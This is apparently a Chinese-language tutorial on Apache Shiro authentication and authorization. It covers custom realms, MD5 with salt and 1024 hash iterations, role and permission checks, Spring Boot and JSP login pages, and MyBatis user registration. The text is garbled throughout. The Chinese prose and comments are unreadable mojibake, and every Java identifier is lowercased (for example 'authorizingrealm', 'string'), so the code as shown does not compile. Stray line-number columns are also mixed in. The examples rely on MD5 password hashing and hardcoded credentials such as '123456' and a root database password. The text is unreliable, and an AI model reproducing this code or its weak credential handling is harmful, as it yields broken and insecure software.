org.apache.shiro.realm.authenticatingrealm;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\n\npublic class customerrealm extends authorizingrealm {\n  @override\n  protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n    return null;\n  }\n\n  @override\n  protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n    string credentials = (string) authenticationtoken.getcredentials();\n    if ("zhangsan".equals(credentials)){\n      \n      // æ¨¡ææ¥åºæ¥çå¯ç æ¯å å¯åçå¯ç ï¼å¶ä»ä¸å\n      simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo(\n        "zhangsan",\n        "e10adc3949ba59abbe56e057f20f883e",\n        this.getname());\n\n      return authenticationinfo;\n    }\n    return null;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\næµè¯æ¹æ³ï¼\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.customerrealm;\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.authc.credential.hashedcredentialsmatcher;\nimport org.apache.shiro.mgt.defaultsecuritymanager;\nimport org.apache.shiro.subject.subject;\n\npublic class testmd5realm {\n    public static void main(string[] args) {\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n\n        customerrealm customerrealm = new customerrealm();\n\n        // è®¾ç½®md5å å¯\n        hashedcredentialsmatcher hashedcredentialsmatcher = new hashedcredentialsmatcher();\n        hashedcredentialsmatcher.sethashalgorithmname("md5");\n\n        customerrealm.setcredentialsmatcher(hashedcredentialsmatcher);\n\n        defaultsecuritymanager.setrealm(customerrealm);\n\n        securityutils.setsecuritymanager(defaultsecuritymanager);\n\n        subject subject = securityutils.getsubject();\n\n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            system.out.println("ç»éæå");\n        } catch (authenticationexception e) {\n            e.printstacktrace();\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n# èªå®ä¹realmå®ç°md5å saltæ¹å¼\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.realm.authenticatingrealm;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\nimport org.apache.shiro.util.bytesource;\n\npublic class customerrealm extends authorizingrealm {\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        return null;\n    }\n\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        string principal = (string) authenticationtoken.getprincipal();\n\n        if ("zhangsan".equals(principal)){\n            simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo(\n                    "zhangsan",\n                    "a43ebab3045680d4b3d6c5ccac659d10",\n                    // ç±äºçä¹æ¯ä»æ°æ®åºä¸­æ¥åºæ¥çï¼å æ­¤å¨è¿éä¸èµ·éç½®äº\n                    bytesource.util.bytes("123/bmk#"),\n                    this.getname());\n\n            return authenticationinfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\næµè¯æ¹æ³åä¸é¢çä¸æ ·ã\n\n# èªå®ä¹realm å®ç° èªå®ä¹md5+salt+æ£å\n\n 1. å¦æä½¿ç¨äºæ£åhashï¼åä»æ°æ®åºä¸­æ¥åºæ¥çæ¯æ£åä¹åçï¼å æ­¤realmä¸éè¦å\n\n 2. æµè¯æ¹æ³ä¸­éè¦æå®æ£åçæ¬¡æ°ï¼å ä¸ºç¨æ·è¾å¥ææå¯ç æ¶ï¼shrioä¸ç¥éæ£åçæ¬¡æ°ï¼å æ­¤å¯¹æ¯ä¼å¤±è´¥ã\n    \n    package com.pwddd.shirodemo;\n    \n    import com.pwddd.shirodemo.realm.customerrealm;\n    import org.apache.shiro.securityutils;\n    import org.apache.shiro.authc.authenticationexception;\n    import org.apache.shiro.authc.incorrectcredentialsexception;\n    import org.apache.shiro.authc.usernamepasswordtoken;\n    import org.apache.shiro.authc.credential.hashedcredentialsmatcher;\n    import org.apache.shiro.mgt.defaultsecuritymanager;\n    import org.apache.shiro.subject.subject;\n    \n    public class testmd5realm {\n      public static void main(string[] args) {\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n    \n        customerrealm customerrealm = new customerrealm();\n    \n        // è®¾ç½®md5å å¯\n        hashedcredentialsmatcher hashedcredentialsmatcher = new hashedcredentialsmatcher();\n        hashedcredentialsmatcher.sethashalgorithmname("md5");\n        // è®¾ç½®æ£åæ¬¡æ°\n        hashedcredentialsmatcher.sethashiterations(1024);\n    \n        customerrealm.setcredentialsmatcher(hashedcredentialsmatcher);\n    \n        defaultsecuritymanager.setrealm(customerrealm);\n    \n        securityutils.setsecuritymanager(defaultsecuritymanager);\n    \n        subject subject = securityutils.getsubject();\n    \n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n    \n        try {\n          subject.login(token);\n          system.out.println("ç»éæå");\n        } catch (incorrectcredentialsexception e) {\n          e.printstacktrace();\n          system.out.println("å¯ç éè¯¯");\n        }\n      }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# shiroææ\n\n> ææï¼å³è®¿é®æ§å¶ï¼æ§å¶è°è½è®¿é®åªäºèµæºãä¸»ä½è¿è¡èº«ä»½è®¤è¯åéè¦åéæéæ¹å¯è®¿é®ç³»ç»çèµæºï¼å¯¹äºæäºèµæºæ²¡ææéæ¯æ æ³è®¿é®çã\n\n\n# shiro ææçå³é®å¯¹è±¡\n\nwhoï¼å³ä¸»ä½ï¼subjectï¼ï¼ä¸»ä½éè¦è®¿é®ç³»ç»ä¸­çèµæºã\n\nwhatï¼å³èµæºï¼resource)ï¼å¦ç³»ç»èåãé¡µé¢ãæé®ãç±»æ¹æ³ãç³»ç»ååä¿¡æ¯ç­ãèµæºåæ¬èµæºç±»ååèµæºå®ä¾ï¼æ¯å¦ååä¿¡æ¯ä¸ºèµæºç±»åï¼ç±»åä¸ºt01çååä¸ºèµæºå®ä¾ï¼ç¼å·ä¸º001çååä¿¡æ¯ä¹å±äºèµæºå®ä¾ã\n\nhowï¼æé/è®¸å¯ï¼permission)ï¼è§å®äºä¸»ä½å¯¹èµæºçæä½è®¸å¯ï¼æéç¦»å¼èµæºæ²¡ææä¹ï¼å¦ç¨æ·æ¥è¯¢æéãç¨æ·æ·»å æéãæä¸ªç±»æ¹æ³çè°ç¨æéãç¼å·ä¸º001ç¨æ·çä¿®æ¹æéç­ï¼éè¿æéå¯ç¥ä¸»ä½å¯¹åªäºèµæºé½æåªäºæä½è®¸å¯ã\n\n\n# ææçæµç¨\n\n\n\n\n# ææçæ¹å¼\n\n * åºäºè§è²çè®¿é®æ§å¶\n\n * rbacåºäºè§è²çè®¿é®æ§å¶ï¼role-based access controlï¼æ¯ä»¥è§è²ä¸ºä¸­å¿è¿è¡è®¿é®æ§å¶\n\nif(subject.hasrole("admin")){\n   //æä½ä»ä¹èµæº\n}\n\n\n1\n2\n3\n\n\n * åºäºèµæºçè®¿é®æ§å¶\n   \n   * rbacåºäºèµæºçè®¿é®æ§å¶ï¼resource-based access controlï¼æ¯ä»¥èµæºä¸ºä¸­å¿è¿è¡è®¿é®æ§å¶\n   \n   if(subject.ispermission("user:update:01")){ //èµæºå®ä¾\n     //å¯¹01ç¨æ·è¿è¡ä¿®æ¹\n   }\n   if(subject.ispermission("user:update:*")){  //èµæºç±»å\n     //å¯¹01ç¨æ·è¿è¡ä¿®æ¹\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n\n# æéå­ç¬¦ä¸²\n\næéå­ç¬¦ä¸²çè§åæ¯ï¼èµæºæ è¯ç¬¦ï¼æä½ï¼èµæºå®ä¾æ è¯ç¬¦ï¼æææ¯ å¯¹åªä¸ªèµæºçåªä¸ªå®ä¾å·æä»ä¹æä½ï¼â:âæ¯èµæº/æä½/å®ä¾çåå²ç¬¦ï¼æéå­ç¬¦ä¸²ä¹å¯ä»¥ä½¿ç¨*ééç¬¦ã\n\nä¾å­ï¼\n\n * ç¨æ·åå»ºæéï¼user:createï¼æuser:create:*\n * ç¨æ·ä¿®æ¹å®ä¾001çæéï¼user:update:001\n * ç¨æ·å®ä¾001çæææéï¼user:*ï¼001\n\n\n# ææå®ç°æ¹å¼\n\n * ç¼ç¨å¼\n\nsubject subject = securityutils.getsubject();\nif(subject.hasrole(âadminâ)) {\n\t//ææé\n} else {\n\t//æ æé\n}\n\n\n1\n2\n3\n4\n5\n6\n\n * æ³¨è§£å¼\n\n@requiresroles("admin")\npublic void hello() {\n\t//ææé\n}\n\n\n1\n2\n3\n4\n\n * æ ç­¾å¼\n\njsp/gsp æ ç­¾ï¼å¨jsp/gsp é¡µé¢éè¿ç¸åºçæ ç­¾å®æï¼\n<shiro:hasrole name="admin">\n\t<!â ææéâ>\n</shiro:hasrole>\næ³¨æ: thymeleaf ä¸­ä½¿ç¨shiroéè¦é¢å¤éæ!\n\n\n1\n2\n3\n4\n5\n\n\n\n# å¼åå®ç°\n\n 1. èªå®ä¹realm\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.authz.simpleauthorizationinfo;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\nimport org.apache.shiro.util.bytesource;\n\npublic class customermd5realm extends authorizingrealm {\n    /**\n     * ææ\n     * @param principalcollection\n     * @return\n     */\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n\n        string principal = (string) principalcollection.getprimaryprincipal();\n        system.out.println("--------------------------------------------");\n        system.out.println("principal:"+principal);\n\n        simpleauthorizationinfo simpleauthorizationinfo = new simpleauthorizationinfo();\n        simpleauthorizationinfo.addrole("admin");\n\n        simpleauthorizationinfo.addstringpermission("user:create:*");\n        return simpleauthorizationinfo;\n    }\n\n    /**\n     * è®¤è¯\n     * @param authenticationtoken\n     * @return\n     * @throws authenticationexception\n     */\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n\n        string principal = (string) authenticationtoken.getprincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            authenticationinfo authenticationinfo = new simpleauthenticationinfo(\n                    principal,\n                    "a991e133559f1891893b60a3c04e8740",\n                    bytesource.util.bytes("123/bmk#"),\n                    this.getname()\n            );\n            return authenticationinfo;\n\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n 2. æææµè¯ä»£ç \n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.customermd5realm;\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.incorrectcredentialsexception;\nimport org.apache.shiro.authc.unknownaccountexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.authc.credential.hashedcredentialsmatcher;\nimport org.apache.shiro.mgt.defaultsecuritymanager;\nimport org.apache.shiro.subject.subject;\n\npublic class testcustomermd5realm {\n    public static void main(string[] args) {\n\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n        customermd5realm customermd5realm = new customermd5realm();\n\n        hashedcredentialsmatcher hashedcredentialsmatcher = new hashedcredentialsmatcher();\n        hashedcredentialsmatcher.sethashalgorithmname("md5");\n        hashedcredentialsmatcher.sethashiterations(1024);\n\n        customermd5realm.setcredentialsmatcher(hashedcredentialsmatcher);\n        defaultsecuritymanager.setrealm(customermd5realm);\n\n        securityutils.setsecuritymanager(defaultsecuritymanager);\n\n        subject subject = securityutils.getsubject();\n\n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            system.out.println("è®¤è¯æå");\n            system.out.println(subject.hasrole("admin"));\n            system.out.println(subject.ispermitted("user:create:01"));\n        } catch (unknownaccountexception e) {\n//            e.printstacktrace();\n            system.out.println("ç¨æ·åä¸å­å¨");\n        } catch (incorrectcredentialsexception e){\n            system.out.println("å¯ç éè¯¯");\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# æ´åspringboot\n\n\n# æ´åçæè·¯\n\n\n\n\n# æ´åçæ­¥éª¤\n\n# 0. åå»ºspringbooté¡¹ç®\n\n\n\n# 1. å¼å¥ç¸å³ä¾èµ\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>com.pwddd</groupid>\n    <artifactid>springboot_jsp_shiro</artifactid>\n    <version>1.0-snapshot</version>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-parent</artifactid>\n        <version>2.6.4</version>\n    </parent>\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-test</artifactid>\n            <scope>test</scope>\n        </dependency>\n\n        <dependency>\n            <groupid>org.projectlombok</groupid>\n            <artifactid>lombok</artifactid>\n            <version>1.18.2</version>\n            <optional>true</optional>\n        </dependency>\n\n        <dependency>\n            <groupid>org.apache.tomcat.embed</groupid>\n            <artifactid>tomcat-embed-jasper</artifactid>\n        </dependency>\n\n        <dependency>\n            <groupid>jstl</groupid>\n            <artifactid>jstl</artifactid>\n            <version>1.2</version>\n        </dependency>\n\n    </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\nå¼å¥shiroæ´åspringboot\n\n<dependency>\n  <groupid>org.apache.shiro</groupid>\n  <artifactid>shiro-spring-boot-starter</artifactid>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 2. éç½®spring booté¡¹ç®\n\néç½®springbootéç½®æä»¶\n\nserver.port=8888\nserver.servlet.context-path=/shiro\nspring.mvc.view.prefix=/\nspring.mvc.view.suffix=.jsp\n\n\n1\n2\n3\n4\n\n\néç½®å·¥ä½ç®å½\n\n\n\n# 3. éç½®shiroç¯å¢\n\n# 0. åå»ºéç½®ç±»\n\npackage com.pwddd.shiro.config;\n\nimport com.pwddd.shiro.realm.customerrealm;\nimport org.apache.shiro.realm.realm;\nimport org.apache.shiro.spring.web.shirofilterfactorybean;\nimport org.apache.shiro.web.mgt.defaultwebsecuritymanager;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.hashmap;\nimport java.util.map;\n\n/**\n * ç¨äºæ´åshiroçéç½®ç±»\n */\n@configuration\npublic class shiroconfig {\n    //1. åå»ºshiro filter\n    @bean\n    public shirofilterfactorybean getshirofilterfactorybean(defaultwebsecuritymanager defaultwebsecuritymanager){\n        shirofilterfactorybean factorybean = new shirofilterfactorybean();\n        factorybean.setsecuritymanager(defaultwebsecuritymanager);\n\n        // éç½®ç³»ç»çåéèµæºåå¬å±èµæº\n        map<string,string> map = new hashmap<>();\n        map.put("/login.jsp","anon");\n        map.put("/user/login","anon");\n        map.put("/**","authc");\n\n        // é»è®¤çè®¤è¯çé¢ login.jsp\n        factorybean.setloginurl("/login.jsp");\n\n        factorybean.setfilterchaindefinitionmap(map);\n        return factorybean;\n\n\n    }\n    //2. åå»ºå®å¨ç®¡çå¨\n    @bean\n    public defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm){\n        defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n        defaultwebsecuritymanager.setrealm(realm);\n        return defaultwebsecuritymanager;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n# 1. åå»ºèªå®ä¹realm\n\npackage com.pwddd.shiro.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\n\npublic class customerrealm extends authorizingrealm {\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        return null;\n    }\n\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        system.out.println("====================================");\n        string principal = (string) authenticationtoken.getprincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo(\n                    principal,\n                    "123456",\n                    this.getname()\n            );\n            return authenticationinfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# 2. éç½®é¡µé¢è·³è½¬\n\npackage com.pwddd.shiro.controller;\n\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.incorrectcredentialsexception;\nimport org.apache.shiro.authc.unknownaccountexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.subject.subject;\nimport org.springframework.stereotype.controller;\nimport org.springframework.web.bind.annotation.getmapping;\nimport org.springframework.web.bind.annotation.postmapping;\nimport org.springframework.web.bind.annotation.requestmapping;\n\n@controller\n@requestmapping("user")\npublic class usercontroller {\n\n    @postmapping("login")\n    public string login(string username,string password){\n\n        subject subject = securityutils.getsubject();\n\n        try {\n            subject.login(new usernamepasswordtoken(username,password));\n            return "redirect:/index.jsp";\n        } catch (unknownaccountexception e) {\n//            e.printstacktrace();\n            system.out.println("ç¨æ·åéè¯¯");\n        } catch (incorrectcredentialsexception e){\n            system.out.println("å¯ç éè¯¯");\n        }\n\n        return "redirect:/login.jsp";\n    }\n    @getmapping("logout")\n    public string logout(){\n        subject subject = securityutils.getsubject();\n        subject.logout();\n        return "redirect:/login.jsp";\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\næ³¨æ:\n\né»è®¤å¨éç½®å¥½shiroç¯å¢åé»è®¤ç¯å¢ä¸­æ²¡æå¯¹é¡¹ç®ä¸­ä»»ä½èµæºè¿è¡æéæ§å¶,ææç°å¨é¡¹ç®ä¸­ææèµæºé½å¯ä»¥éè¿è·¯å¾è®¿é®\n\n# 4. å¸¸è§è¿æ»¤å¨\n\næ³¨æ: shiroæä¾åå¤ä¸ªé»è®¤çè¿æ»¤å¨ï¼æä»¬å¯ä»¥ç¨è¿äºè¿æ»¤å¨æ¥éç½®æ§å¶æå®urlçæéï¼\n\néç½®ç¼©å                å¯¹åºçè¿æ»¤å¨                           åè½\nanon                anonymousfilter                  æå®urlå¯ä»¥å¿åè®¿é®\nauthc               formauthenticationfilter         æå®urléè¦formè¡¨åç»å½ï¼é»è®¤ä¼ä»è¯·æ±ä¸­è·åusernameãpassword,remembermeç­åæ°å¹¶å°è¯ç»å½ï¼å¦æç»å½ä¸äºå°±ä¼è·³è½¬å°loginurléç½®çè·¯å¾ãæä»¬ä¹å¯ä»¥ç¨è¿ä¸ªè¿æ»¤å¨åé»è®¤çç»å½é»è¾ï¼ä½æ¯ä¸è¬é½æ¯æä»¬èªå·±å¨æ§å¶å¨åç»å½é»è¾çï¼èªå·±åçè¯åºéè¿åçä¿¡æ¯é½å¯ä»¥å®å¶åã\nauthcbasic          basichttpauthenticationfilter    æå®urléè¦basicç»å½\nlogout              logoutfilter                     ç»åºè¿æ»¤å¨ï¼éç½®æå®urlå°±å¯ä»¥å®ç°éåºåè½ï¼éå¸¸æ¹ä¾¿\nnosessioncreation   nosessioncreationfilter          ç¦æ­¢åå»ºä¼è¯\nperms               permissionsauthorizationfilter   éè¦æå®æéæè½è®¿é®\nport                portfilter                       éè¦æå®ç«¯å£æè½è®¿é®\nrest                httpmethodpermissionfilter       å°httpè¯·æ±æ¹æ³è½¬åæç¸åºçå¨è¯æ¥æé ä¸ä¸ªæéå­ç¬¦ä¸²ï¼è¿ä¸ªæè§æä¹ä¸å¤§ï¼æå´è¶£èªå·±çæºç çæ³¨é\nroles               rolesauthorizationfilter         éè¦æå®è§è²æè½è®¿é®\nssl                 sslfilter                        éè¦httpsè¯·æ±æè½è®¿é®\nuser                userfilter                       éè¦å·²ç»å½æâè®°ä½æâçç¨æ·æè½è®¿é®\n\n# 5. è®¤è¯çå®ç°\n\n# 1. login.jspå¼åè®¤è¯çé¢\n\n<%--\n  created by intellij idea.\n  user: plankton\n  date: 2022/3/28\n  time: 20:26\n  to change this template use file | settings | file templates.\n--%>\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n  <head>\n    <title>ç»å½</title>\n  </head>\n  <body>\n    <h1>ç»å½</h1>\n    <form action="${pagecontext.request.contextpath}/user/login" method="post">\n      ç¨æ·åï¼<input type="text" name="username" > <br>\n      å¯ç  ï¼<input type="password" name="password"> <br>\n      <input type="submit" name="æäº¤">\n    </form>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 2. indexé¡µé¢\n\n<%--\n  created by intellij idea.\n  user: plankton\n  date: 2022/3/28\n  time: 20:26\n  to change this template use file | settings | file templates.\n--%>\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n  <head>\n    <title>é¦é¡µ</title>\n  </head>\n  <body>\n    <h1>é¦é¡µ</h1>\n    <a href="${pagecontext.request.contextpath}/user/logout">éåºç»é</a> <br>\n    <ul>\n      <li><a href="#">ç¨æ·ç®¡ç</a></li>\n      <li><a href="#">ååç®¡ç</a></li>\n      <li><a href="#">è®¢åç®¡ç</a></li>\n      <li><a href="#">ç©æµç®¡ç</a></li>\n    </ul>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 7. md5åsaltè®¤è¯çå®ç°\n\n# 0. å®ç°æ³¨å\n\næ³¨åé¡µé¢ï¼\n\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n<head>\n    <title>æ³¨å</title>\n</head>\n<body>\n<h1>æ³¨å</h1>\n<form action="${pagecontext.request.contextpath}/user/register" method="post">\n    ç¨æ·åï¼<input type="text" name="username" > <br>\n    å¯ç  ï¼<input type="password" name="password"> <br>\n    <input type="submit" name="æäº¤">\n</form>\n</body>\n</html>\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. å¼å¥æ°æ®åº\n\nç¸å³ä¾èµ\n\n<dependency>\n  <groupid>org.mybatis.spring.boot</groupid>\n  <artifactid>mybatis-spring-boot-starter</artifactid>\n  <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupid>mysql</groupid>\n  <artifactid>mysql-connector-java</artifactid>\n  <version>8.0.28</version>\n</dependency>\n\n<dependency>\n  <groupid>com.alibaba</groupid>\n  <artifactid>druid</artifactid>\n  <version>1.2.8</version>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\néç½®\n\n# æ°æ®æº\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\nspring.datasource.url=jdbc:mysql://localhost:3306/shirodemo?characterencoding=utf8\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n\n\nåå»ºentity\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport lombok.experimental.accessors;\n\n@data\n@accessors(chain = true)\n@noargsconstructor\n@allargsconstructor\npublic class user {\n    private string id;\n    private string username;\n    private string password;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¼åmapperæä»¶\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype mapper\n        public "-//mybatis.org//dtd mapper 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\n\x3c!--åç§°ç©ºé´åæ¥è¯¢ä¸­çåç§°ç©ºé´ä¸è´--\x3e\n<mapper namespace="com.pwddd.shirojsp.mapper.usermapper">\n\n    <insert id="save" parametertype="com.pwddd.shirojsp.entity.user">\n        insert into t_user values(#{id},#{username},#{password})\n    </insert>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\néç½®mybatis\n\n# mybatis\nmybatis.type-aliases-package=com.pwddd.shirojsp.entity\nmybatis.mapper-locations=classpath:mapper/*.xml\n\n\n1\n2\n3\n\n\nåå»ºserviceå±\n\npackage com.pwddd.shirojsp.service.impl;\n\nimport com.pwddd.shirojsp.entity.user;\nimport com.pwddd.shirojsp.mapper.usermapper;\nimport com.pwddd.shirojsp.service.userservice;\nimport org.apache.shiro.crypto.hash.md5hash;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.service;\n\nimport java.util.uuid;\n\n@service("userserviceimpl")\npublic class userserviceimpl implements userservice {\n\n    @autowired\n    private usermapper usermapper;\n\n    @override\n    public void register(user user) {\n        string uuid = uuid.randomuuid().tostring();\n        uuid = uuid.replace("-","");\n        user.setid(uuid);\n        md5hash md5hash = new md5hash(user.getpassword(), uuid, 1024);\n        user.setpassword(md5hash.tohex());\n        usermapper.save(user);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nç¼åcontrollerå±\n\n@postmapping("register")\npublic string register(user user){\n  userservice.register(user);\n  return "redirect:/login.jsp";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 3. è®¤è¯å®ç°\n\næ°æ®åºæ¥è¯¢ç¨æ·ä¿¡æ¯\n\n @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        system.out.println("====================================");\n        string principal = (string) authenticationtoken.getprincipal();\n\n        // 1. å©ç¨åå­å»æ¥è¯¢æ°æ®åº\n        user user = userservice.getuser(principal);\n        if (user != null){\n            return new simpleauthenticationinfo(\n                    user.getusername(),\n                    user.getpassword(),\n                    bytesource.util.bytes(user.getid()),\n                    this.getname()\n            );\n        }\n        return null;\n    